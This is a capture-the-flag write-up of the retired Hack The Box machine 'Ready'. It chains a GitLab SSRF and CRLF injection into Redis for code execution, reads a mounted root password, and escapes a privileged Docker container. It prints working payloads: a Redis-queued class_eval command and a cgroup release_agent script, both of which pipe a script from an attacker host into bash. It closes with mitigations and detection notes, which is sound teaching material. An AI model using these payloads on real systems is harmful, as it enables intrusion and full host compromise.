---
machine: Ready
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, gitlab, ssrf, crlf, redis, docker, privileged, cgroup, privesc]
---

# Ready — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

GitLab 11.4.7 on `5080` is vulnerable to SSRF CVE-2018-19571 and CRLF injection CVE-2018-19585 in repository imports. The SSRF bypasses the `127.0.0.1` block with the IPv6 address `[0:0:0:0:0:ffff:127.0.0.1]`, and CRLF allows sending commands to Redis on `6379`. `GitlabShellWorker` plus `class_eval` executes a shell as `git` inside the container. The compose file mounts `/root_pass` with the initial root password, allowing `su -`. The container runs with `privileged: true`; the cgroup `release_agent` escape, or mounting the host disk, gives root on the machine.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,5080 <IP>
```

- `22`: OpenSSH 8.2p1 Ubuntu.
- `5080`: GitLab 11.4.7 over HTTP.

```bash
echo '<IP> ready.htb' | sudo tee -a /etc/hosts
```

## Enumeration

The main page is GitLab. Register an account and check the version under `/help`; the instance is outdated. Under **New Project → Import Project → Repo by URL** the server requests the supplied URL, confirming the SSRF.

```bash
curl -s http://ready.htb:5080/help | grep -i version
```

## Foothold

The import accepts `http://`, `https://` and `git://`. GitLab blocks `127.0.0.1` but not the IPv6 loopback representation:

```text
http://[0:0:0:0:0:ffff:127.0.0.1]:6379
```

With `git://` the request is cleaner. CVE-2018-19585 allows newlines in the URL and therefore independent Redis commands. Intercept the import in Burp and send a body like this:

```text
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open('|curl http://<LHOST>/shell.sh|bash').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"<JID>\",\"created_at\":0,\"enqueued_at\":0}"
 exec
```

The URL must reach Redis over loopback:

```text
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git
```

Creating the project makes the worker run `class_eval`, and a shell arrives as `git`. Automated exploits for this chain also exist.

```bash
python3 -c 'import pty; pty.spawn("bash")'
```

## Lateral movement

Inside the container, `/.dockerenv` confirms isolation. The compose file mounts `/root_pass`, which holds GitLab's initial root password:

```bash
cat /root_pass
su -
```

## Privilege escalation

The host's `docker-compose.yml` defines the service with `privileged: true`. That flag allows escaping the container. One path is the cgroup `release_agent`: mount the host cgroup, write a script and force its execution from the container.

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$t/c" > "$d/release_agent"
printf '#!/bin/sh\ncurl http://<LHOST>/shell.sh | bash' > /c
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
```

The second path is mounting the host disk from the privileged container and reading `/mnt/root/root.txt` or writing a key to `/mnt/root/.ssh/authorized_keys`.

## Evidence

- GitLab 11.4.7 and the URL import form.
- SSRF against `[0:0:0:0:0:ffff:127.0.0.1]:6379`.
- Redis commands injected through CRLF and a shell as `git`.
- `/root_pass` read and a successful `su -` inside the container.
- `privileged: true` in the compose file and root execution on the host.

## Lessons learned

- A `127.0.0.1` blacklist does not cover every loopback representation.
- CRLF in import URLs turns an SSRF into protocol injection.
- Unauthenticated Redis reachable over loopback is code execution.
- Secrets mounted into a container must not be readable by the application.
- `privileged: true` removes isolation and allows escaping to the host.

## Mitigations and detection

- Update GitLab and validate import URLs against an allowlist.
- Block loopback, mapped IPv4/IPv6 and internal ranges in the resolver.
- Reject control characters and newlines in URLs.
- Require authentication on Redis and keep it off the network.
- Avoid privileged containers and mount only the required volumes.
- Monitor `release_agent`, cgroup mounts and unexpected `chroot` processes.

## References

- [0xdf — Ready](https://0xdf.gitlab.io/2021/05/15/htb-ready.html)
- [Hack The Box — Ready](https://app.hackthebox.com/machines/ready)
- [NVD — CVE-2018-19571](https://nvd.nist.gov/vuln/detail/CVE-2018-19571)
- [NVD — CVE-2018-19585](https://nvd.nist.gov/vuln/detail/CVE-2018-19585)
- [Knowledge — release_agent escape](../../../knowledge/linux/cgroup-release-agent-escape.md)
- [Knowledge — Privileged container escape](../../../knowledge/linux/docker-privileged-escape.md)
